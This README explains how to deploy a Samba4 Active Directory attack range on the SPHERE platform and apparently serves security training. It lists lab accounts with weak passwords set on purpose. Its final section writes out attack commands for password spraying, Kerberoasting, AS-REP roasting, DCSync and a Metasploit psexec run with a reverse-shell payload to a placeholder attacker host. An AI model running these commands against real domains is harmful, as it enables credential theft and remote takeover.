# Deploy a Samba4 Active Directory Domain Environment
In this example, we demonstrate how to deploy a cyber attack range on the SPHERE platform that includes one attacker machine, one domain controller, and multiple domain member servers.

## Detailed Deploying Steps

### Deploy the Cyber Range Environment

1. In the "Model Editor" interface of the SPHERE platform, deploy the this model [`mergexp/ad.py`](../mergexp/ad.py).

2. Create a Reservation based on that model.

3. Activate the Reservation.

4. In your Experiment Development Containers (XDCs), attach to the activation. If you used machines of Ubuntu 24.04, by default, the 32 GB disk allocated to a virtual machine is not automatically expanded/mounted to the root (/) filesystem, which can make the system unusable. On such machines, the following commands usually need to be executed manually:
    ```
    sudo partprobe
    sudo resize2fs /dev/vda3
    ```

    You can also run this [script](../initial_setup/resize-root-disk.md) on the XDC server to solve this issue.


### Deploy the Target Victim Machines
We use Ansible to automatically configure the domain controller and all domain member servers. The domain controller runs Samba4 AD DC, while each member server joins the domain automatically.

0. Before running the commands below, you need to [install Ansible](../setup_ansible/readme.md) first.

1. Check each machine's hostname and username, then update the corresponding configuration in [`setup_samba_ad/inventory.ini`](inventory.ini) accordingly.
    ```ini
    # Domain Controller
    [dc]
    victimDC ansible_host=victimDC

    # Domain Members
    [domain_members]
    victim1 ansible_host=victim1
    victim2 ansible_host=victim2
    victim3 ansible_host=victim3
    victim4 ansible_host=victim4
    victim5 ansible_host=victim5

    [samba_ad:vars]
    ansible_user=YOUR_USERNAME
    ansible_python_interpreter=/usr/bin/python3
    domain_name=YOURCOMPANY.LOCAL
    domain_netbios=YOURCOMPANY
    domain_admin_password=P@ssw0rd123!
    dc_ip=10.0.2.1
    ```

2. Execute the following command to deploy the complete environment (domain controller + all domain members):
    ```bash
    cd setup_samba_ad/
    ./run-setup.sh all
    ```

    Alternatively, you can deploy in stages:
    ```bash
    ./run-setup.sh dc       # Deploy domain controller only
    ./run-setup.sh members  # Deploy domain members only
    ```

    Or use Ansible directly:
    ```bash
    ansible-playbook site.yml --ask-become-pass
    ```

    (Note: You may not need to type the password when deploying this on SPHERE since it does not require it. Simply just hit the "Enter" key.)

For full details on Ansible deployment options, see [`ANSIBLE_DEPLOYMENT.md`](ANSIBLE_DEPLOYMENT.md).

### Deploy the Attack Machine
Please refer to this [doc](../attacker_setup/readme.md) to setup the attack machine.


## Detailed Information about the Target System

### Environment Architecture

```
                    ┌─────────────────┐
                    │  victimDC (DC)  │
                    │  Samba AD DC    │
                    └────────┬────────┘
                             │
         ┌───────────────────┼───────────────────┐
         │                   │                   │
┌────────┴────────┐ ┌────────┴────────┐ ┌────────┴────────┐
│    victim1      │ │    victim2      │ │  victim3/4/5    │
│  Domain Member  │ │  Domain Member  │ │  Domain Members │
└─────────────────┘ └─────────────────┘ └─────────────────┘
         │
┌────────┴────────┐
│    attacker     │
│  Kali Linux     │
└─────────────────┘
```

### Domain Configuration

| Parameter | Value |
|-----------|-------|
| Domain (Realm) | `YOURCOMPANY.LOCAL` |
| NetBIOS Name | `YOURCOMPANY` |
| Domain Admin Password | `P@ssw0rd123!` |
| DC Hostname | `victimDC` |

### Services

| Service | Host | Port | Description |
|---------|------|------|-------------|
| Samba AD DC | victimDC | 389 (LDAP), 88 (Kerberos), 445 (SMB) | Active Directory Domain Controller |
| Winbind | All members | — | Domain user/group resolution |
| SMB | All members | 445 | File sharing |

## Test User List

| Username | Password | Role | Notes |
|----------|----------|------|-------|
| Administrator | P@ssw0rd123! | Domain Admin | Domain administrator |
| admin.backup | Backup@dmin1 | Domain Admin | Backup administrator |
| jsmith | Summer2024! | Domain User | Regular user |
| mwilson | Welcome123! | Domain User | Regular user |
| svc_sql | SqlService1! | Domain User | SQL service account (has SPN, Kerberoastable) |

## Testing (from attacker machine)
Replace IP addresses with the actual values for your environment.

### Verify Domain Controller Reachability

```bash
# Check LDAP port
nmap -p 88,389,445 <DC_IP>

# List SMB shares
smbclient -L //<DC_IP> -U jsmith%'Summer2024!'
```

### Password Spraying

```bash
crackmapexec smb <DC_IP> -u users.txt -p 'Summer2024!' --continue-on-success
```

### Kerberoasting

```bash
# svc_sql has an SPN — obtain TGS ticket and crack offline
GetUserSPNs.py YOURCOMPANY.LOCAL/jsmith:'Summer2024!' -dc-ip <DC_IP> -request
```

### AS-REP Roasting

```bash
# Find users without pre-authentication required
GetNPUsers.py YOURCOMPANY.LOCAL/ -usersfile users.txt -dc-ip <DC_IP>
```

### LDAP Enumeration

```bash
# Authenticated LDAP query
ldapsearch -x -H ldap://<DC_IP> -D "jsmith@yourcompany.local" -w 'Summer2024!' \
    -b "DC=yourcompany,DC=local" "(objectClass=user)" cn sAMAccountName
```

### DCSync (Requires Domain Admin)

```bash
secretsdump.py YOURCOMPANY/Administrator:'P@ssw0rd123!'@<DC_IP>
```

### Metasploit — SMB Relay / Pass-the-Hash

```
use exploit/windows/smb/psexec
set RHOSTS <VICTIM_IP>
set SMBUser Administrator
set SMBPass P@ssw0rd123!
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST <ATTACKER_IP>
set LPORT 4444
exploit
```
